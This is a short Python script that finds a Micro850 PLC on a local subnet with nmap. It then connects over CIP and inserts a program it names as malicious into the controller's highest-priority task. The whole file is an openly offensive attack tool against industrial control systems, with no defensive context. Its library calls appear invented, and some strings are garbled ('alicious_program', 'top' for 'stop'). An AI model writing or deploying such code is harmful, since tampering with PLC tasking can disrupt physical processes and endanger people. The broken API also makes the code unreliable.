import subprocess
from scapy.all import *
import time
import threading
from pycomm import CIP

# Define the subnet to scan
subnet = '192.168.1.0/24'

def find_plc_ip(subnet):
    try:
        output = subprocess.check_output(['nmap', '-sP', subnet]).decode('utf-8')
        for line in output.split('\n'):
            if 'Micro850' in line:  
                ip_address = line.split(' ')[-1]
                return ip_address
    except Exception as e:
        print(f"Failed to find PLC IP: {e}")
        return None

def modify_controller_tasking(plc_ip, program_name):
    try:
        # Create a CIP connection to the PLC
        cip_client = CIP.Client(plc_ip, 44818)
        
        # Login to the PLC
        cip_client.connect()
        cip_client.login()
        
        # Get the list of tasks
        tasks = cip_client.get_tasks()
        
        # Find the task with the highest priority
        highest_priority_task = None
        highest_priority = 0
        for task in tasks:
            if task['priority'] > highest_priority:
                highest_priority_task = task
                highest_priority = task['priority']
        
        # Add the malicious program to the highest priority task
        cip_client.add_program_to_task(highest_priority_task['name'], program_name)
        
        print(f"Added {program_name} to {highest_priority_task['name']} task")
    except Exception as e:
        print(f"Failed to modify controller tasking: {e}")

def main():
    plc_ip = find_plc_ip(subnet)
    if plc_ip:
        print(f"PLC IP Address: {plc_ip}")
        
        # Define the malicious program name
        program_name = 'alicious_program'
        
        # Modify the controller tasking
        modify_controller_tasking(plc_ip, program_name)
        
        while True:
            user_input = input("Type 'top' to stop modifying controller tasking: ")
            if user_input.lower() == 'top':
                break
    else:
        print("PLC not found.")

if __name__ == "__main__":
    main()